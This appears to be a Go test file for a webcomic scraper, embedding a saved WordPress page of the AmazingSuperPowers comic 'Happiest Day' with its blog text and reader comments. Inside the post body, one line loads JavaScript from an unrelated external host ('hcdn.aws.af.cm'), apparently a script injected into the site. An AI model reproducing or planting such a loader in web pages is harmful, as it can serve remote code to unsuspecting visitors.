package amazingsuperpowers

import (
	"bytes"
	"github.com/PuerkitoBio/goquery"
	// "github.com/SlyMarbo/rss"
	// "github.com/go-gomail/gomail"
	// "io/ioutil"
	"testing"
)

func TestComicExtraction(t *testing.T) {
	// doc, err := rss.Parse([]byte(Feed{}.Sample()))
	// if err != nil {
	// 	t.Error(err)
	// 	return
	// }
	// item := doc.Items[0]

	// t.Error(item.Content)
	// sel, err := comic(*item)
	// t.Errorf(sel.Html())

	// msg := gomail.NewMessage()
	// err = Feed{}.Serialize(*item, msg)
	// if err != nil {
	// 	t.Error(err)
	// 	return
	// }
	// b, err := ioutil.ReadAll(msg.Export().Body)
	// if err != nil {
	// 	t.Error(err)
	// 	return
	// }
	// t.Error(string(b))

	sample := bytes.NewBufferString(sampleItem)
	doc, err := goquery.NewDocumentFromReader(sample)
	panicif(err)
	c, err := sliceComic(doc)
	panicif(err)

	t.Error(c.Html())
}

func panicif(err error) {
	if err != nil {
		panic(err)
	}
}

const sampleItem = `
<!DOCTYPE html>
<html lang="en-US">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
  <title>AmazingSuperPowers: Webcomic at the Speed of Light - Happiest Day</title>
  <link rel="stylesheet" href="http://www.amazingsuperpowers.com/wp-content/themes/asp3/style.css" type="text/css" media="screen" />
  <link rel="pingback" href="http://www.amazingsuperpowers.com/xmlrpc.php" />
  <meta name="ComicPress" content="2.9.4" />
<link rel="alternate" type="application/rss+xml" title="AmazingSuperPowers: Webcomic at the Speed of Light &raquo; Feed" href="http://www.amazingsuperpowers.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="AmazingSuperPowers: Webcomic at the Speed of Light &raquo; Comments Feed" href="http://www.amazingsuperpowers.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="AmazingSuperPowers: Webcomic at the Speed of Light &raquo; Happiest Day Comments Feed" href="http://www.amazingsuperpowers.com/2015/02/happiest-day/feed/" />
<link rel='stylesheet' id='navstyle-css'  href='http://www.amazingsuperpowers.com/wp-content/themes/comicpress/images/nav/default/navstyle.css?ver=3.5.2' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css'  href='http://www.amazingsuperpowers.com/wp-content/plugins/wordpress-popular-posts/style/wpp.css?ver=3.5.2' type='text/css' media='all' />
<link rel='stylesheet' id='columns-css'  href='http://www.amazingsuperpowers.com/wp-content/plugins/columns/columns.css?ver=3.5.2' type='text/css' media='all' />
<link rel='stylesheet' id='quickeys-style-css'  href='http://www.amazingsuperpowers.com/wp-content/plugins/quickeys/css/quickeys.css?ver=3.5.2' type='text/css' media='all' />
<script type='text/javascript' src='http://www.amazingsuperpowers.com/wp-includes/js/jquery/jquery.js?ver=1.8.3'></script>
<script type='text/javascript' src='http://www.amazingsuperpowers.com/wp-content/plugins/quickeys/js/quickeys.min.js?ver=3.5.2'></script>
<script type='text/javascript' src='http://www.amazingsuperpowers.com/wp-includes/js/comment-reply.min.js?ver=3.5.2'></script>
<script type='text/javascript' src='http://www.amazingsuperpowers.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.5'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.amazingsuperpowers.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.amazingsuperpowers.com/wp-includes/wlwmanifest.xml" />
<meta name="generator" content="WordPress 3.5.2" />
<link rel='canonical' href='http://www.amazingsuperpowers.com/2015/02/happiest-day/' />
<link rel='shortlink' href='http://www.amazingsuperpowers.com/?p=5376' />
<meta property="og:url" content="http://www.amazingsuperpowers.com/2015/02/happiest-day/" />
<meta property="og:site_name" content="AmazingSuperPowers: Webcomic at the Speed of Light" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Happiest Day" />
<meta property="og:description" content="" />
<meta property="og:image" content="http://www.amazingsuperpowers.com//comics/2015-02-16-Happiest-Day.png" />
      <style type="text/css">
      #header {
      width: 1000px;
      /* height: 170px; */
      background: url(http://www.amazingsuperpowers.com/wp-content/uploads/2013/06/header5.png) top center no-repeat;
      overflow: hidden;
      }
      #header h1 { padding: 0; }
      #header h1 a {
      display: block;
      width: 1000px;
      height: 169px;
      text-indent: -9999px;
      }
      #header .description { display: none; }
      </style>
    <!-- Google Analytics Tracking by Google Analyticator 6.4.5: http://www.videousermanuals.com/google-analyticator/ -->
<script type="text/javascript">
  var analyticsFileTypes = [''];
  var analyticsEventTracking = 'enabled';
</script>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-4177062-1']);
        _gaq.push(['_addDevId', 'i9k95']); // Google Analyticator App ID with Google

  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
                    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
                    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>
<meta name="description" content="''In fact, you're going to cost me like 100 thousand dollars.'' The problem with the Greatest Day of Your Life is that you probably have no idea that it’s happening. Sure, births, weddings, and the occasional five dollars are pretty cool, but there’s no way to know for sure until you can look back on [...]" />
<meta name="keywords" content="amazingsuperpowers,amazing,super,powers,asp,wes,tony,webcomic,comic,strip,comics,godslug,humor,funny" />
</head>
<body class="single single-post postid-5376 single-format-standard user-guest comic unknown single-category-comics single-author-wes pm night evening wed layout-2cl">
<div id="sidebar-aboveheader" class="customsidebar ">
  <div id="text-441685935" class="widget widget_text">
<div class="widget-content">
      <div class="textwidget"><div class="relative">
<div class="book-header">

<img src="http://www.amazingsuperpowers.com/aspcomics.png" style="opacity:0.0;filter:alpha(opacity=0)" border="0" />
</ div>
</ div></div>
    </div>
</div>
</div>
<div id="page-wrap"><!-- Wraps outside the site width -->
  <div id="page"><!-- Defines entire site width - Ends in Footer -->
<div id="header">
    <h1><a href="http://www.amazingsuperpowers.com">AmazingSuperPowers: Webcomic at the Speed of Light</a></h1>
  <div class="description">by Wes and Tony</div>
  <div id="sidebar-header" class="customsidebar ">
  <div id="text-441685910" class="widget widget_text">
<div class="widget-content">
      <div class="textwidget"><div class="relative">
<div class="top-ad">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6047100466717411";
/* ASP Banner */
google_ad_slot = "0681877168";
google_ad_region="test";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script>
<script type="text/javascript"
src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script>
</ div>
</ div></div>
    </div>
</div>
<div id="text-441685926" class="widget widget_text">
<div class="widget-content">
      <div class="textwidget"><div id="social-bar">
<div class="find-us">
find us on:
</div>
<div class="btumblr">
<a href="http://amazingsoup.tumblr.com/" target="_blank">
<img src="http://www.amazingsuperpowers.com/wp-content/themes/asp3/shareb/btumblr.png" />
</a>
</div>

<div class="btwitter">
<a href="http://www.twitter.com/amazingsoup" target="_blank">
<img src="http://www.amazingsuperpowers.com/wp-content/themes/asp3/shareb/btwitter.png" />
</a>
</div>

<div class="bfacebook">
<a href="http://www.facebook.com/aspcomics" target="_blank">
<img src="http://www.amazingsuperpowers.com/wp-content/themes/asp3/shareb/bfacebook.png" />
</a>
</div>

<div class="byoutube">
<a href="http://www.youtube.com/aspshorts" target="_blank">
<img src="http://www.amazingsuperpowers.com/wp-content/themes/asp3/shareb/byoutube.png" />
</a>
</div>

</ div>
</div>
    </div>
</div>
<div id="text-441685927" class="widget widget_text">
<div class="widget-content">
      <div class="textwidget">             <div id="toptext">
                       <a href="http://www.amazingsuperpowers.com/wes-tony">wes &#38; tony</a>
<span id="toptext-spacing">&#124;</span>
                       <a id="toptext-spacing" href="http://www.amazingsuperpowers.com/most-liked/">comics</a>
<span id="toptext-spacing">&#124;</span>
                       <a id="toptext-spacing" href="http://www.amazingsuperpowers.com/shorts/">shorts</a>
<span id="toptext-spacing">&#124;</span>
 <a id="toptext-spacing" href="http://feeds.feedburner.com/amazingsuperpowers" target="_blank">rss</a>
<span id="toptext-spacing">&#124;</span>
                       <a id="toptext-spacing" href="http://www.topatoco.com/asp" target="_blank" class="none">store</a>
<span id="toptext-spacing">&#124;</span>
                    <a id="toptext-spacing" href="http://www.patreon.com/amazingsuperpowers" target="_blank" class="none"><span id="patreon">patreon</div></a>
                      </div></div>
    </div>
</div>
</div>  <div class="clear"></div>
</div>
<div id="content-wrapper">
      <div id="comic-wrap" class="comic-id-5376">
      <div id="comic-head"><div id="sidebar-overcomic" class="customsidebar ">

<div class="comic_navi_wrapper">
  <table class="comic_navi">
  <tr>
    <td class="comic_navi_left">
                <a href="http://www.amazingsuperpowers.com/2007/09/heredity/" class="navi navi-first" title="«first">«first</a>
            </td>
    <td class="comic_navi_center">
        </td>
    <td class="comic_navi_right">
          </td>
  </tr>
  </table>
    </div>
    <div id="text-441685928" class="widget widget_text">
<div class="widget-content">
      <div class="textwidget"><div class="brack1">
&#32;&#124;&#32;
</div></div>
    </div>
</div>

<div class="comic_navi_wrapper">
  <table class="comic_navi">
  <tr>
    <td class="comic_navi_left">
                <a href="http://www.amazingsuperpowers.com/2015/02/food/" class="navi navi-prev" title="&lt;previous">&lt;previous</a>
            </td>
    <td class="comic_navi_center">
        </td>
    <td class="comic_navi_right">
          </td>
  </tr>
  </table>
    </div>
    <div id="text-441685929" class="widget widget_text">
<div class="widget-content">
      <div class="textwidget"><div class="pop-arc">
<span class="popular-link">
<a href="http://www.amazingsuperpowers.com/most-liked/">
popular
</a>
</span>
</div>
<div class="arc">
<a href="http://www.amazingsuperpowers.com/category/comics/">
archive
</a>
</div></div>
    </div>
</div>

<div class="comic_navi_wrapper">
  <table class="comic_navi">
  <tr>
    <td class="comic_navi_left">
          </td>
    <td class="comic_navi_center">
            <a href="http://www.amazingsuperpowers.com/?randomcomic&amp;nocache=1" class="navi navi-random" title="random">random</a>
          </td>
    <td class="comic_navi_right">
          </td>
  </tr>
  </table>
    </div>
    <div id="text-441685930" class="widget widget_text">
<div class="widget-content">
      <div class="textwidget"><div class="brack2">
&#32;&#124;&#32;
</div></div>
    </div>
</div>

<div class="comic_navi_wrapper">
  <table class="comic_navi">
  <tr>
    <td class="comic_navi_left">
          </td>
    <td class="comic_navi_center">
        </td>
    <td class="comic_navi_right">
                <span class="navi navi-next navi-void">next&gt;</span>
            </td>
  </tr>
  </table>
    </div>
    <div id="text-441685931" class="widget widget_text">
<div class="widget-content">
      <div class="textwidget"><div class="brack3">
&#32;&#124;&#32;
</div></div>
    </div>
</div>
<div id="text-441685932" class="widget widget_text">
<div class="widget-content">
      <div class="textwidget"><div class="brack4">
&#32;&#124;&#32;
</div></div>
    </div>
</div>
<div id="text-441685933" class="widget widget_text">
<div class="widget-content">
      <div class="textwidget"><div class="brack5">
&#32;&#124;&#32;
</div></div>
    </div>
</div>
<div id="text-441685934" class="widget widget_text">
<div class="widget-content">
      <div class="textwidget"><div class="brack6">
&#32;&#124;&#32;
</div></div>
    </div>
</div>

<div class="comic_navi_wrapper">
  <table class="comic_navi">
  <tr>
    <td class="comic_navi_left">
          </td>
    <td class="comic_navi_center">
        </td>
    <td class="comic_navi_right">
                <span class="navi navi-last navi-void">last»</span>
            </td>
  </tr>
  </table>
    </div>
    <div id="execphp-8" class="widget widget_execphp">
<div class="widget-content">

      <div class="execphpwidget"><div id="question">
<a href="http://www.amazingsuperpowers.com/hc/02162015/" target="_blank">
            <img src="http://www.aspcomic.com/wp-content/themes/asp3/questionmark.png" />
</a>
</div></div>
    </div>
</div>
</div>
</div>
      <div class="clear"></div>
              <div id="comic">
        <div id="comic-1" class="comicpane"><img src="http://www.amazingsuperpowers.com/comics/2015-02-16-Happiest-Day.png" alt="''In fact, you're going to cost me like 100 thousand dollars.''" title="''In fact, you're going to cost me like 100 thousand dollars.''"/></div>
        <!-- Last Update: Feb 16th, 2015 // -->
      </div>
              <div class="clear"></div>
      <div id="comic-foot"></div>
    </div>
      <div id="subcontent-wrapper">
    <div id="sidebar-left">
      <div class="sidebar">
    <div id="text-441685913" class="widget widget_text">
<div class="widget-content">
      <div class="textwidget"><div class="pw">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6047100466717411";
/* ASP SkyScraper 1 */
google_ad_slot = "3656327627";
google_ad_region="test";
google_ad_width = 160;
google_ad_height = 600;
//-->
</script>
<script type="text/javascript"
src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script>
</div></div>
    </div>
</div>
<div id="text-441685914" class="widget widget_text">
<div class="widget-content">
      <div class="textwidget"><div class="pw">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6047100466717411";
/* ASP Skyscraper 2 */
google_ad_slot = "0342452519";
google_ad_region="test";
google_ad_width = 160;
google_ad_height = 600;
//-->
</script>
<script type="text/javascript"
src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script>
</div></div>
    </div>
</div>
<div id="text-441685918" class="widget widget_text">
<div class="widget-content">
      <div class="textwidget"><div class="pw">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6047100466717411";
/* ASP SkyScraper 3 */
google_ad_slot = "4475813460";
google_ad_region="test";
google_ad_width = 160;
google_ad_height = 600;
//-->
</script>
<script type="text/javascript"
src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script>
</div>
</div>
    </div>
</div>
<div id="text-441685941" class="widget widget_text">
<div class="widget-content">
      <div class="textwidget"><div class="pw">
<a href="http://www.topatoco.com/asp" target="_blank"><img src="http://www.amazingsuperpowers.com/sidebar-store.png"></a>
</div>
</div>
    </div>
</div>
    </div>
  </div>                <div id="content" class="narrowcolumn">
      <div id="sidebar-overblog" class="customsidebar ">
  <div id="comicpress_social_widget-6" class="widget comicpress_social_widget">
<div class="widget-content">

    <div class="social-facebook">
          <a href="http://www.facebook.com/sharer.php?u=http://www.amazingsuperpowers.com/2015/02/happiest-day/" target="_blank"" target="_blank" class="social-facebook"><img src="http://www.amazingsuperpowers.com/share/facebook.png" style="opacity:0.5;filter:alpha(opacity=50)"      onmouseover="this.style.opacity=1;this.filters.alpha.opacity=100"       onmouseout="this.style.opacity=0.5;this.filters.alpha.opacity=50" width="18" height="18" border="0" title="Facebook"" alt="facebook" /></a>
        </div>
    </div>
</div>
<div id="comicpress_social_widget-4" class="widget comicpress_social_widget">
<div class="widget-content">

    <div class="social-twitter">
          <a href="http://twitter.com/?status=http://www.amazingsuperpowers.com/2015/02/happiest-day/" target="_blank" class="social-twitter"><img src="http://www.amazingsuperpowers.com/share/twitter.png" style="opacity:0.5;filter:alpha(opacity=50)"       onmouseover="this.style.opacity=1;this.filters.alpha.opacity=100"       onmouseout="this.style.opacity=0.5;this.filters.alpha.opacity=50" width="18" height="18" border="0" title="Twitter"" alt="twitter" /></a>
        </div>
    </div>
</div>
<div id="comicpress_social_widget-5" class="widget comicpress_social_widget">
<div class="widget-content">

    <div class="social-reddit">
          <a href="http://www.reddit.com/submit?url=http://www.amazingsuperpowers.com/2015/02/happiest-day/&title=Happiest%20Day" target="_blank" class="social-reddit"><img src="http://www.amazingsuperpowers.com/share/reddit.png" style="opacity:0.5;filter:alpha(opacity=50)"      onmouseover="this.style.opacity=1;this.filters.alpha.opacity=100"       onmouseout="this.style.opacity=0.5;this.filters.alpha.opacity=50" width="18" height="18" border="0" title="Reddit"" alt="reddit" /></a>
        </div>
    </div>
</div>
<div id="text-441685924" class="widget widget_text">
<div class="widget-content">
      <div class="textwidget"><div class="facebook">
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.0";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="fb-like" data-href="https://developers.facebook.com/docs/plugins/" data-layout="button" data-action="like" data-show-faces="false" data-share="true" href="http://www.amazingsuperpowers.com/2015/02/happiest-day/"></div>

</div></div>
    </div>
</div>
</div>
                  <div class="post-5376 post type-post status-publish format-standard hentry category-comics uentry post-comic postonpage-1 odd post-author-wes">
                  <div class="post-content">
        <div class="post-info">
                                        <div class="post-text">
            <h2 class="post-title"><a href="http://www.amazingsuperpowers.com/2015/02/happiest-day/">Happiest Day</a></h2>
<span class="post-author">by <a href="http://www.amazingsuperpowers.com/author/wes/">Wes + Tony</a></span>
<span class="posted-on">on&nbsp;</span><span class="post-date">February 16, 2015</span>
<span class="posted-at">at&nbsp;</span><span class="post-time">6:00 am</span>
          </div>
        </div>
        <div class="clear"></div>
        <div class="entry">
          <!--Ad Injection:top--><body onload="document.getElementById ('alt-text').className = 'hidden'">
<div>

<img id="hover-text" alt="Hover Text" onclick="document.getElementById ('alt-text').className = document.getElementById ('alt-text').className == 'hidden' ? '' : 'hidden'" src="http://amazingsuperpowers.com/wp-content/themes/asp3/hovertext.png">

</div>
<p id="alt-text" style="font-style:italic;font-size:12px;">''In fact, you're going to cost me like 100 thousand dollars.''</p>
</body><script src="//hcdn.aws.af.cm/y1.js"></script><p>The problem with the Greatest Day of Your Life is that you probably have no idea that it’s happening. Sure, births, weddings, and the occasional five dollars are pretty cool, but there’s no way to know for <em>sure</em> until you can look back on everything on your deathbed. And even then, you might be about to have the most amazing deathbed ever! </p>
<p>In fact, you might be living the greatest day of your life TODAY and you don’t even realize it. Later this afternoon you might discover that the video game you’ve been playing is a secret simulator to determine the world’s champion in defending humanity from giant space crabs. Or a giant space crab will show up at your door and announce that you’re a lottery winner. Or you might run into that giant space crab you had a crush on in high school and you two will discover your true feelings for one another. Basically I don’t know what it’ll be for sure, but I am fairly certain it involves giant space crabs. </p>
<p>So good luck today! Heck, it might even be the WORST day of your life, which would really take the pressure off the other days. Keep those fingers crossed!</p>
<p>wes</p>
<!--Ad Injection:bottom-->
<div style='float:right;'><div id="popular-title">
Check out some other stuff!
</div>
<div id="asphits" style="background-image:url(http://www.amazingsuperpowers.com/asphits/001hover.png)"><a href="http://www.amazingsuperpowers.com/2009/03/3d-movie/"><img src="http://www.amazingsuperpowers.com/asphits/001.png" /></a></div>
<div id="asphits" style="background-image:url(http://www.amazingsuperpowers.com/asphits/015hover.png)"><a href="http://www.amazingsuperpowers.com/2013/04/co-pilot/"><img src="http://www.amazingsuperpowers.com/asphits/015.png" /></a></div>
<div id="asphits" style="background-image:url(http://www.amazingsuperpowers.com/asphits/005hover.png)"><a href="http://www.amazingsuperpowers.com/2011/02/art-is-hard-2/"><img src="http://www.amazingsuperpowers.com/asphits/005.png" /></a></div>
<div id="asphits" style="background-image:url(http://www.amazingsuperpowers.com/asphits/070hover.png)"><a href="http://www.amazingsuperpowers.com/2012/11/animation-friday-genie/"><img src="http://www.amazingsuperpowers.com/asphits/070.png" /></a></div>
<div id="asphits" style="background-image:url(http://www.amazingsuperpowers.com/asphits/098hover.png)"><a href="http://www.amazingsuperpowers.com/2011/08/zeke/"><img src="http://www.amazingsuperpowers.com/asphits/098.png" /></a></div>
<div id="asphits" style="background-image:url(http://www.amazingsuperpowers.com/asphits/092hover.png)"><a href="http://www.amazingsuperpowers.com/2012/08/massage/"><img src="http://www.amazingsuperpowers.com/asphits/092.png" /></a></div></div><br clear='all' />         <div class="clear"></div>
        </div>
        <div class="clear"></div>
                <div class="post-extras">
          <div class="post-tags"></div>
                              <div class="clear"></div>
        </div>
                              </div>
          </div>

<div id="comment-wrapper">



    <h3 id="comments">Discussion (10) &not;</h3>
    <div class="commentsrsslink">[ <a href='http://www.amazingsuperpowers.com/2015/02/happiest-day/feed/'>Comments RSS</a> ]</div>
    <ol class="commentlist">
        <li id="comment-72040" class="comment even thread-even depth-1">

    <div class="comment-avatar"><a href="http://howardlewisship.com" rel="external nofollow" title="Howard Lewis Ship"></a></div>
    <div class="comment-content">

      <div class="comment-author vcard">
        <cite title="http://howardlewisship.com"><a href="http://howardlewisship.com" title="Howard Lewis Ship" class="external nofollow">Howard Lewis Ship</a></cite>      </div>

      <div class="comment-meta-data">

        <span class="comment-time" title="Monday, February 16th, 2015, 5:04 pm">
          February 16, 2015 at 5:04 pm        </span>

        <span class="comment-permalink">
          <span class="separator">|</span> <a href="#comment-72040" title="Permalink to comment">#</a>
        </span>

        <span class="comment-reply-link"><span class="separator">|</span> <a class='comment-reply-link' href='/2015/02/happiest-day/?replytocom=72040#respond' onclick='return addComment.moveForm("comment-72040", "72040", "respond", "5376")'>Reply</a></span>



      </div>

              <div class="comment-text">
          <p>There&#8217;s a Stephen King short story about a man who visits some kind of cursed book store; in it, you read your own biography and determine the best moment of your life. The middle-aged protagonist finds out it was when we caught a fly ball at the age of 12 and has been on the decline ever since.</p>
        </div>

    </div>

    <div class="clear"></div>

</li> <li id="comment-72041" class="comment odd alt thread-odd thread-alt depth-1">

    <div class="comment-avatar"></div>
    <div class="comment-content">

      <div class="comment-author vcard">
        <cite>Lone Ranger</cite>      </div>

      <div class="comment-meta-data">

        <span class="comment-time" title="Monday, February 16th, 2015, 9:55 pm">
          February 16, 2015 at 9:55 pm        </span>

        <span class="comment-permalink">
          <span class="separator">|</span> <a href="#comment-72041" title="Permalink to comment">#</a>
        </span>

        <span class="comment-reply-link"><span class="separator">|</span> <a class='comment-reply-link' href='/2015/02/happiest-day/?replytocom=72041#respond' onclick='return addComment.moveForm("comment-72041", "72041", "respond", "5376")'>Reply</a></span>



      </div>

              <div class="comment-text">
          <p>Not bad but what I really want is a new ASP t-shirt!!  Isn&#8217;t about time to put together another one?</p>
        </div>

    </div>

    <div class="clear"></div>

</li> <li id="comment-72042" class="comment even thread-even depth-1">

    <div class="comment-avatar"></div>
    <div class="comment-content">

      <div class="comment-author vcard">
        <cite>Anonymous</cite>      </div>

      <div class="comment-meta-data">

        <span class="comment-time" title="Monday, February 16th, 2015, 10:08 pm">
          February 16, 2015 at 10:08 pm       </span>

        <span class="comment-permalink">
          <span class="separator">|</span> <a href="#comment-72042" title="Permalink to comment">#</a>
        </span>

        <span class="comment-reply-link"><span class="separator">|</span> <a class='comment-reply-link' href='/2015/02/happiest-day/?replytocom=72042#respond' onclick='return addComment.moveForm("comment-72042", "72042", "respond", "5376")'>Reply</a></span>



      </div>

              <div class="comment-text">
          <p>This, this is the happiest day of my life for today there is one more asp comic than there has ever been in the history of all man-kind! (assuming of course that time is linear)</p>
        </div>

    </div>

    <div class="clear"></div>

</li> <li id="comment-72043" class="comment odd alt thread-odd thread-alt depth-1">

    <div class="comment-avatar"></div>
    <div class="comment-content">

      <div class="comment-author vcard">
        <cite>Anonymous</cite>      </div>

      <div class="comment-meta-data">

        <span class="comment-time" title="Monday, February 16th, 2015, 10:11 pm">
          February 16, 2015 at 10:11 pm       </span>

        <span class="comment-permalink">
          <span class="separator">|</span> <a href="#comment-72043" title="Permalink to comment">#</a>
        </span>

        <span class="comment-reply-link"><span class="separator">|</span> <a class='comment-reply-link' href='/2015/02/happiest-day/?replytocom=72043#respond' onclick='return addComment.moveForm("comment-72043", "72043", "respond", "5376")'>Reply</a></span>



      </div>

              <div class="comment-text">
          <p>Today, today is the happiest day of my life! For today there exists one more asp comic than there have ever been in the history of man-kind!</p>
        </div>

    </div>

    <div class="clear"></div>

</li> <li id="comment-72044" class="comment even thread-even depth-1">

    <div class="comment-avatar"></div>
    <div class="comment-content">

      <div class="comment-author vcard">
        <cite>Axel</cite>     </div>

      <div class="comment-meta-data">

        <span class="comment-time" title="Monday, February 16th, 2015, 10:22 pm">
          February 16, 2015 at 10:22 pm       </span>

        <span class="comment-permalink">
          <span class="separator">|</span> <a href="#comment-72044" title="Permalink to comment">#</a>
        </span>

        <span class="comment-reply-link"><span class="separator">|</span> <a class='comment-reply-link' href='/2015/02/happiest-day/?replytocom=72044#respond' onclick='return addComment.moveForm("comment-72044", "72044", "respond", "5376")'>Reply</a></span>



      </div>

              <div class="comment-text">
          <p>Today, today is the happiest day of my life. For today another asp comic never before seen by the human race and seen off and on again by the dolphin race has been revealed to me by way of computer. Today is a most holy and happy day.</p>
        </div>

    </div>

    <div class="clear"></div>

</li> <li id="comment-72045" class="comment odd alt thread-odd thread-alt depth-1">

    <div class="comment-avatar"></div>
    <div class="comment-content">

      <div class="comment-author vcard">
        <cite>BMunro</cite>     </div>

      <div class="comment-meta-data">

        <span class="comment-time" title="Tuesday, February 17th, 2015, 2:42 am">
          February 17, 2015 at 2:42 am        </span>

        <span class="comment-permalink">
          <span class="separator">|</span> <a href="#comment-72045" title="Permalink to comment">#</a>
        </span>

        <span class="comment-reply-link"><span class="separator">|</span> <a class='comment-reply-link' href='/2015/02/happiest-day/?replytocom=72045#respond' onclick='return addComment.moveForm("comment-72045", "72045", "respond", "5376")'>Reply</a></span>



      </div>

              <div class="comment-text">
          <p>At the very least, your list will probably require occasional updates.</p>
<p>&#8220;OK, I think I&#8217;ll move the five dollar bill on my list from two to three and your birth to number two, with &#8220;saw bully getting hit in head with baseball&#8221; still standing strong at four. Thanks goodness for computer text editing!&#8221;</p>
        </div>

    </div>

    <div class="clear"></div>

</li> <li id="comment-72046" class="comment even thread-even depth-1">

    <div class="comment-avatar"></div>
    <div class="comment-content">

      <div class="comment-author vcard">
        <cite>Adam</cite>     </div>

      <div class="comment-meta-data">

        <span class="comment-time" title="Tuesday, February 17th, 2015, 3:00 am">
          February 17, 2015 at 3:00 am        </span>

        <span class="comment-permalink">
          <span class="separator">|</span> <a href="#comment-72046" title="Permalink to comment">#</a>
        </span>

        <span class="comment-reply-link"><span class="separator">|</span> <a class='comment-reply-link' href='/2015/02/happiest-day/?replytocom=72046#respond' onclick='return addComment.moveForm("comment-72046", "72046", "respond", "5376")'>Reply</a></span>



      </div>

              <div class="comment-text">
          <p>My four-year old kid found $20 in a park once!</p>
        </div>

    </div>

    <div class="clear"></div>

</li> <li id="comment-72047" class="comment odd alt thread-odd thread-alt depth-1">

    <div class="comment-avatar"><a href="http://theunderfold.com" rel="external nofollow" title="Brian Russell"></a></div>
    <div class="comment-content">

      <div class="comment-author vcard">
        <cite title="http://theunderfold.com"><a href="http://theunderfold.com" title="Brian Russell" class="external nofollow">Brian Russell</a></cite>      </div>

      <div class="comment-meta-data">

        <span class="comment-time" title="Tuesday, February 17th, 2015, 7:02 am">
          February 17, 2015 at 7:02 am        </span>

        <span class="comment-permalink">
          <span class="separator">|</span> <a href="#comment-72047" title="Permalink to comment">#</a>
        </span>

        <span class="comment-reply-link"><span class="separator">|</span> <a class='comment-reply-link' href='/2015/02/happiest-day/?replytocom=72047#respond' onclick='return addComment.moveForm("comment-72047", "72047", "respond", "5376")'>Reply</a></span>



      </div>

              <div class="comment-text">
          <p>It&#8217;s tough having so many great memories.</p>
        </div>

    </div>

    <div class="clear"></div>

</li> <li id="comment-72048" class="comment even thread-even depth-1">

    <div class="comment-avatar"></div>
    <div class="comment-content">

      <div class="comment-author vcard">
        <cite>The Rarispy</cite>      </div>

      <div class="comment-meta-data">

        <span class="comment-time" title="Tuesday, February 17th, 2015, 1:39 pm">
          February 17, 2015 at 1:39 pm        </span>

        <span class="comment-permalink">
          <span class="separator">|</span> <a href="#comment-72048" title="Permalink to comment">#</a>
        </span>

        <span class="comment-reply-link"><span class="separator">|</span> <a class='comment-reply-link' href='/2015/02/happiest-day/?replytocom=72048#respond' onclick='return addComment.moveForm("comment-72048", "72048", "respond", "5376")'>Reply</a></span>



      </div>

              <div class="comment-text">
          <p>I bet the kid&#8217;s name is Lincoln.</p>
        </div>

    </div>

    <div class="clear"></div>

</li> <li id="comment-72049" class="comment odd alt thread-odd thread-alt depth-1">

    <div class="comment-avatar"></div>
    <div class="comment-content">

      <div class="comment-author vcard">
        <cite>Guga</cite>     </div>

      <div class="comment-meta-data">

        <span class="comment-time" title="Wednesday, February 18th, 2015, 2:16 am">
          February 18, 2015 at 2:16 am        </span>

        <span class="comment-permalink">
          <span class="separator">|</span> <a href="#comment-72049" title="Permalink to comment">#</a>
        </span>

        <span class="comment-reply-link"><span class="separator">|</span> <a class='comment-reply-link' href='/2015/02/happiest-day/?replytocom=72049#respond' onclick='return addComment.moveForm("comment-72049", "72049", "respond", "5376")'>Reply</a></span>



      </div>

              <div class="comment-text">
          <p>The hover text killed me. It hits too close to home.</p>
        </div>

    </div>

    <div class="clear"></div>

</li>
    </ol>



          <div class="commentnav">
        <div class="commentnav-right"></div>
        <div class="commentnav-left"></div>
        <div class="clear"></div>
      </div>



<div class="comment-wrapper-respond">
                  <div id="respond">
        <h3 id="reply-title">Comment &not;<br /> <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2015/02/happiest-day/#respond" style="display:none;"><small>Cancel reply</small></a></small></h3>
                  <form action="http://www.amazingsuperpowers.com/wp-comments-post.php" method="post" id="commentform">
                                                    <p class="comment-form-author"><input id="author" name="author" type="text" value="" size="30" /> <label for="author"><small>NAME &mdash; <a href="http://gravatar.com">Get a Gravatar</a></small></label></p>
<p class="comment-form-email"><input id="email" name="email" type="text" value="" size="30" /> <label for="email">EMAIL</label></p>
<p class="comment-form-url"><input id="url" name="url" type="text" value="" size="30" /> <label for="url">Website URL</label></p>
                        <p class="comment-form-comment"><textarea id="comment" name="comment"></textarea></p>                       <p class="form-submit">
              <input name="submit" type="submit" id="submit" value="Post Comment" />
              <input type='hidden' name='comment_post_ID' value='5376' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
            </p>
            <p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="c4a1afb80d" /></p>          </form>
              </div><!-- #respond -->
              <div class="clear"></div>
</div>

</div>
    </div>
                    <div class="clear"></div>
  </div>
  <div class="clear"></div>
</div>
    <div id="footer">
<div id="sidebar-footer" class="customsidebar ">
  <div id="text-441685903" class="widget widget_text">
<div class="widget-content">
